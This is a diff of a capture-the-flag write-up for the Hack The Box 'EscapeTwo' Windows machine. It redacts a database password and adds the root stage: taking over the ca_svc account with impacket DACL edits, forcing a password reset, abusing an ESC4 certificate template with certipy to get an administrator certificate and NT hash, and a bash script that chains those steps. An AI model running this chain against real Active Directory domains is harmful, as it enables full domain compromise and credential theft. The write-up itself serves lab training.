@@ -5,6 +5,7 @@ tags:
   - easy
   - windows
 ---
+
 ***As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su***
 # Nmap Scan
 ```plaintext
@@ -167,7 +168,7 @@ Using a `MSSQL` server login for the `sa` user, we can connect to the `MSSQL` se
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ impacket-mssqlclient -dc-ip 10.10.11.51 -target-ip 10.10.11.51 -p 1433 'sa:MSSQLP@ssw0rd!'@10.10.11.51
+└─$ impacket-mssqlclient -dc-ip 10.10.11.51 -target-ip 10.10.11.51 -p 1433 'sa:MYSQL_PASSWORD'@10.10.11.51
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Encryption required, switching to TLS
@@ -230,7 +231,7 @@ SQLSVCACCOUNT="SEQUEL\sql_svc"
 SQLSVCPASSWORD="RYAN_PASSWORD"
 SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
 SECURITYMODE="SQL"
-SAPWD="MSSQLP@ssw0rd!"
+SAPWD="MYSQL_PASSWORD"
 ADDCURRENTUSERASSQLADMIN="False"
 TCPENABLED="1"
 NPENABLED="1"
@@ -252,4 +253,178 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\ryan\Documents> type ../Desktop/user.txt
 USER_FLAG_MD5
 *Evil-WinRM* PS C:\Users\ryan\Documents> 
+```
+# Root
+![[static/escapetwo/20250113161756.png]]
+
+![[static/escapetwo/20250113161845.png]]
+Change the owner of `ca_svc`
+```bash
+impacket-owneredit -action write -new-owner "ryan" -target "ca_svc" "ryan:RYAN_PASSWORD"
+```
+
+Add `Write` permissions of `CA_SVC` to `ryan` using `dacledit` tool.
+```bash
+┌──(kali㉿kali)-[~/ctfs/escapetwo]
+└─$ impacket-dacledit -action write -principal ryan -rights FullControl -target CA_SVC -dc-ip 10.10.11.51 sequel.htb/ryan:RYAN_PASSWORD
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20250113-085055.bak
+[*] DACL modified successfully!
+
+```
+
+Force to change password of `CA_SVC` using `net` tool of `rpc` feature.
+```bash
+┌──(kali㉿kali)-[~/ctfs/escapetwo]
+└─$ net rpc password 'CA_SVC' 'Password123a!' -U 'sequel.htb'/'ryan'%'RYAN_PASSWORD' -S 'DC01.sequel.htb'
+```
+
+Find the vulnerable certificate template using `certipy` tool.
+```bash
+┌──(kali㉿kali)-[~/ctfs/escapetwo]
+└─$ certipy-ad find -dc-ip 10.10.11.51 -u ca_svc@sequel.htb -p Password123a! -vulnerable                                                                                                  
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[*] Got CA configuration for 'sequel-DC01-CA'
+[*] Saved BloodHound data to '20250113085406_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20250113085406_Certipy.txt'
+[*] Saved JSON output to '20250113085406_Certipy.json'
+                                                                                                                                                                                                                                           
+
+┌──(kali㉿kali)-[~/ctfs/escapetwo]
+└─$ cat 20250113085406_Certipy.txt                                                      
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+
+```
+
+`DunderMifflinAuthentication` certificate template is vulnerable. We can use the vulnerablty using `certipy` tool's `tempalte` feature and update certificate template.
+```bash
+┌──(kali㉿kali)-[~/ctfs/escapetwo]
+└─$ certipy-ad template -save-old -template DunderMifflinAuthentication -u ca_svc@sequel.htb -p Password123a! -target-ip 10.10.11.51                                
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Successfully updated 'DunderMifflinAuthentication'
+```
+
+Get `administrator` user's `.pfx` certificates to auth.
+```bash
+certipy-ad req -ca sequel-DC01-CA -dc-ip "10.10.11.51" -u "ca_svc" -p "Password123a!" -template "DunderMifflinAuthentication" -target "DC01.sequel.htb" -upn administrator@sequel.htb
+```
+
+Finally get the `administrator` user's `NT` hash.
+```bash
+certipy-ad auth -pfx administrator.pfx
+```
+But all of these steps need to be taken quickly. We can use a script for this. The script may not work one time, try it again and again and it will succeed.
+## Script
+```bash
+#!/bin/bash
+
+# Define variables
+NEW_OWNER='ryan'
+TARGET='ca_svc'
+USERNAME='sequel.htb/ryan'
+PASSWORD='RYAN_PASSWORD'
+DC_IP='10.10.11.51'
+TEMPLATE='DunderMifflinAuthentication'
+TARGET_DC='DC01.sequel.htb'
+
+# Execute the commands
+echo "Changing owner..."
+impacket-owneredit -action write -new-owner "$NEW_OWNER" -target "$TARGET" "$USERNAME:$PASSWORD"
+
+echo "Editing DACL..."
+impacket-dacledit -action 'write' -rights 'FullControl' -principal "$NEW_OWNER" -target "$TARGET" "$USERNAME:$PASSWORD"
+
+echo "Changing password..."
+net rpc password "$TARGET" "$PASSWORD" -U "$USERNAME%$PASSWORD" -S "sequel.htb"
+
+echo "Requesting certificate..."
+certipy-ad template -dc-ip "$DC_IP" -u "$TARGET" -p "$PASSWORD" -template "$TEMPLATE" -target "$TARGET_DC" -save-old
+
+echo "Generating certificate request..."
+certipy-ad req -ca sequel-DC01-CA -dc-ip "$DC_IP" -u "$TARGET" -p "$PASSWORD" -template "$TEMPLATE" -target "$TARGET_DC" -upn administrator@sequel.htb
+
+echo "Generating Admin NT hash..."
+certipy-ad auth -pfx administrator.pfx
+
+echo "All commands executed."
 ```
